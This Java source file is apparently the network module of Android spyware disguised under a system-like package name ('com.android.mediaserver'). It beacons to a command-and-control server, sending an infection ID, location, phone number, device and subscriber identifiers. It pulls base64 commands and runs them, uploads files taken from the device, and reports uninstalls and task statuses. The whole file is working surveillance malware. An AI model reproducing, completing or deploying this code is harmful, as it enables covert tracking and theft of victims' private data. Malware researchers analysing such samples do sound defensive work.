package com.android.mediaserver.network;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Base64;
import com.android.mediaserver.AppConstants;
import com.android.mediaserver.MyApplication;
import com.android.mediaserver.command.CommandHandler;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.task.TaskStatusManager;
import com.android.mediaserver.util.AppUtils;
import com.android.mediaserver.util.DeviceInformation;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import okhttp3.MediaType;
import okhttp3.MultipartBody.Part;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Response;
import timber.log.Timber;

public class NetworkManager {
  private static NetworkManager mInstance;
  private MyApplication mApplication;
  private Config mConfig;
  private Context mContext;
  private DeviceInformation mDeviceInformation;
  private HomeCommunicationService mHomeCommunicationService =
      ((HomeCommunicationService) ServiceGenerator.createService(HomeCommunicationService.class,
          mConfig.getApiUrl(), mConfig.getApiUrl().split("https://")[1].split(":")[0],
          new String(Base64.decode(mConfig.getCertificate(), 0))));
  private SharedPreferences mPreferences;

  private NetworkManager(Context context) {
    mApplication = (MyApplication) context.getApplicationContext();
    mConfig = Config.getInstance(context);
    mContext = context;
    mPreferences = context.getSharedPreferences(AppConstants.PREFERENCES_NAME, 0);
    mDeviceInformation = DeviceInformation.getInstance(context);
  }

  public static NetworkManager getInstance(Context context) {
    if (mInstance == null) {
      mInstance = new NetworkManager(context);
    }
    return mInstance;
  }

  public void checkAndExecuteCommands() {
    if (true == isAllowedToSendHeartbeat()) {
      try {
        Timber.d("Checking for new commands..", new Object[0]);
        Response<ResponseBody> response =
            mHomeCommunicationService.checkCommand(mConfig.getVersion(),
                mConfig.getInfectionId(), mConfig.getCncId(), mConfig.getUuid(),
                mApplication.getLocation(),
                mPreferences.getBoolean(AppConstants.IS_CONNECTED_TO_WIFI_KEY, false),
                mPreferences.getBoolean(AppConstants.IS_ROAMING_KEY, true),
                mDeviceInformation.getDeviceMacAddress(),
                mDeviceInformation.getSubscriberId(), mDeviceInformation.getDeviceId(),
                mDeviceInformation.getCarrierName(), mDeviceInformation.getPhoneNumber(),
                mDeviceInformation.getDeviceManufacturer(),
                mDeviceInformation.getDeviceModel(), mDeviceInformation.getOSVersion())
                .execute();
        mPreferences.edit().putInt(AppConstants.HEARTBEAT_FAILED_COUNT_KEY, 0).commit();
        try {
          String commandsB64 = ((ResponseBody) response.body()).string();
          if (commandsB64 == null || commandsB64.trim().isEmpty()) {
            Timber.d("No new commands", new Object[0]);
            return;
          }
          Timber.d("B64: %s", commandsB64);
          CommandHandler.getInstance(mContext).handleNewCommands(commandsB64);
          return;
        } catch (Throwable e) {
          Timber.e(e, "could not parse commands", new Object[0]);
          return;
        }
      } catch (Throwable e2) {
        Timber.e(e2, "Failed to check for commands", new Object[0]);
        mPreferences.edit()
            .putInt(AppConstants.HEARTBEAT_FAILED_COUNT_KEY,
                mPreferences.getInt(AppConstants.HEARTBEAT_FAILED_COUNT_KEY, 0) + 1)
            .commit();
        return;
      }
    }
    Timber.d("Not allowed to check for commands", new Object[0]);
  }

  public boolean sendFile(File file, String path, String type, String subtype) throws Exception {
    Timber.d("Sending file: %s (%s)", file.getAbsolutePath(),
        AppUtils.readableFileSize(file.length()));
    if (true == isAllowedToSendData()) {
      Part body = Part.createFormData("file", file.getName(),
          RequestBody.create(MediaType.parse("multipart/form-data"), file));
      RequestBody description =
          RequestBody.create(MediaType.parse("multipart/form-data"), "file data");
      try {
        String location = mApplication.getLocation();
        Timber.d("Location: %s", location);
        Response<ResponseBody> response =
            mHomeCommunicationService.upload(body, description, mConfig.getVersion(),
                mConfig.getInfectionId(), mConfig.getCncId(), mConfig.getUuid(),
                type, subtype, String.valueOf(System.currentTimeMillis()), location, path,
                mPreferences.getBoolean(AppConstants.IS_CONNECTED_TO_WIFI_KEY, false),
                mPreferences.getBoolean(AppConstants.IS_ROAMING_KEY, true),
                mDeviceInformation.getDeviceMacAddress(),
                mDeviceInformation.getSubscriberId(), mDeviceInformation.getDeviceId(),
                mDeviceInformation.getCarrierName(), mDeviceInformation.getPhoneNumber(),
                mDeviceInformation.getDeviceManufacturer(),
                mDeviceInformation.getDeviceModel(), mDeviceInformation.getOSVersion())
                .execute();
        mPreferences.edit().putInt(AppConstants.HEARTBEAT_FAILED_COUNT_KEY, 0).commit();
        return response.isSuccessful();
      } catch (Exception e) {
        mPreferences.edit()
            .putInt(AppConstants.HEARTBEAT_FAILED_COUNT_KEY,
                mPreferences.getInt(AppConstants.HEARTBEAT_FAILED_COUNT_KEY, 0) + 1)
            .commit();
        throw e;
      }
    }
    Timber.d("Not allowed to send file: %s", file.getAbsolutePath());
    return false;
  }

  public void notifyUninstall() {
    Timber.d("Notifying uninstall", new Object[0]);
    try {
      if (mHomeCommunicationService.kill(mConfig.getVersion(),
          mConfig.getInfectionId(), mConfig.getCncId(), mConfig.getUuid(),
          mApplication.getLocation(), mDeviceInformation.getDeviceMacAddress(),
          mDeviceInformation.getSubscriberId(), mDeviceInformation.getDeviceId(),
          mDeviceInformation.getCarrierName(), mDeviceInformation.getPhoneNumber(),
          mDeviceInformation.getDeviceManufacturer(), mDeviceInformation.getDeviceModel(),
          mDeviceInformation.getOSVersion(),
          RequestBody.create(MediaType.parse("text/plain"), "killed")).execute().isSuccessful()) {
        Timber.d("Notify uninstall succeeded", new Object[0]);
      } else {
        Timber.d("Failed to notify about uninstall", new Object[0]);
      }
    } catch (Exception e) {
      Timber.d("Failed to notify about uninstall", new Object[0]);
    }
  }

  public void sendTaskStatuses() {
    Timber.d("Sending task statuses", new Object[0]);
    TaskStatusManager taskStatusManager = TaskStatusManager.getInstance(mContext);
    try {
      if (mHomeCommunicationService.sendTaskStatuses(mConfig.getVersion(),
          mConfig.getInfectionId(), mConfig.getCncId(), mConfig.getUuid(),
          mApplication.getLocation(), mDeviceInformation.getDeviceMacAddress(),
          mDeviceInformation.getSubscriberId(), mDeviceInformation.getDeviceId(),
          mDeviceInformation.getCarrierName(), mDeviceInformation.getPhoneNumber(),
          mDeviceInformation.getDeviceManufacturer(), mDeviceInformation.getDeviceModel(),
          mDeviceInformation.getOSVersion(),
          RequestBody.create(MediaType.parse("text/plain"), taskStatusManager.getStatusReport()))
          .execute()
          .isSuccessful()) {
        Timber.d("Task statuses send succeeded", new Object[0]);
        taskStatusManager.cleanTaskStatuses();
        return;
      }
      Timber.d("Failed to send task statuses", new Object[0]);
    } catch (Exception e) {
      Timber.d("Failed to send task statuses", new Object[0]);
    }
  }

  private boolean isAllowedToSendHeartbeat() {
    if (true == Connectivity.isConnectedWifi(mContext)) {
      return true;
    }
    int count = mPreferences.getInt(AppConstants.HEARTBEAT_FAILED_COUNT_KEY, 0) + 1;
    mPreferences.edit().putInt(AppConstants.HEARTBEAT_FAILED_COUNT_KEY, count).commit();
    if (count < mConfig.getFailuresToForceHeartbeat() || Connectivity.isRoaming(
        mContext)) {
      return false;
    }
    Timber.d("Forcing heartbeat", new Object[0]);
    return true;
  }

  private boolean isAllowedToSendData() {
    return true == Connectivity.isConnectedWifi(mContext);
  }

  public void serverLog(String url, boolean onTime) {
    if (true == isAllowedToSendData() && !mPreferences.getBoolean(url, false)) {
      try {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod("GET");
        c.connect();
        do {
        } while (c.getInputStream().read(new byte[1024]) > 0);
        c.disconnect();
        if (onTime) {
          mPreferences.edit().putBoolean(url, true).commit();
        }
      } catch (IOException e) {
      }
    }
  }
}
